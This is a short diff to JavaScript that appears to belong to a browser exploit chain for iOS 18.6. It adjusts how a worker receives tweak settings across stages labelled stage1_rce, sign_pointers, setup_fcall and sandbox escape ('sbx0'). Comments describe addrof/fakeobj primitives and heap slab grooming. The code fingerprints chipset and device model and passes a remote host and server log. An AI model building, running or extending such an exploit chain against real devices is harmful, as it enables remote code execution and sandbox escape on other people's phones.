@@ -233,8 +233,16 @@ let workerBlobUrl = URL.createObjectURL(workerBlob);
             {
                 print("[MSG] sign_pointers");
                 iframe.contentDocument.write('1');
+                // Pass the tweak selection through setup_fcall so the worker
+                // can promote it onto its globalThis right before sbx0 eval,
+                // after all the exploit-prim setup has finished and the slab
+                // layout is no longer load-bearing. Doing this at stage1/
+                // stage1_rce time was disturbing the addrof/fakeobj setup
+                // loop's slab pattern matching and breaking the chain.
                 worker.postMessage({
-                type: 'setup_fcall'
+                type: 'setup_fcall',
+                ls_tweaks: globalThis.__ls_tweaks || 'fiveicon',
+                ls_powercuff_level: globalThis.__ls_powercuff_level || 'heavy'
                 });
                 break;
             }
@@ -306,14 +314,12 @@ let workerBlobUrl = URL.createObjectURL(workerBlob);
         print("desiredHost = " + desiredHost);
             if(ios_version == '18,6' || ios_version == '18,6,1' || ios_version == '18,6,2')
             {
-                print("Sending stage1_rce to worker (iOS 18.6 path) tweaks=" + (globalThis.__ls_tweaks || 'fiveicon') + " level=" + (globalThis.__ls_powercuff_level || 'heavy'));
+                print("Sending stage1_rce to worker (iOS 18.6 path)");
                 worker.postMessage({
                     type: 'stage1_rce',
                     desiredHost,
                     randomValues,
-                    SERVER_LOG,
-                    ls_tweaks: globalThis.__ls_tweaks || 'fiveicon',
-                    ls_powercuff_level: globalThis.__ls_powercuff_level || 'heavy'
+                    SERVER_LOG
                 });
             }
             else
@@ -339,9 +345,7 @@ let workerBlobUrl = URL.createObjectURL(workerBlob);
                         chipset,
                         device_model,
                         desiredHost,
-                        SERVER_LOG,
-                        ls_tweaks: globalThis.__ls_tweaks || 'fiveicon',
-                        ls_powercuff_level: globalThis.__ls_powercuff_level || 'heavy'
+                        SERVER_LOG
                 });
                             }
                         });
@@ -359,9 +363,7 @@ let workerBlobUrl = URL.createObjectURL(workerBlob);
                 chipset,
                 device_model,
                 desiredHost,
-                SERVER_LOG,
-                ls_tweaks: globalThis.__ls_tweaks || 'fiveicon',
-                ls_powercuff_level: globalThis.__ls_powercuff_level || 'heavy'
+                SERVER_LOG
             });
                     }
         });
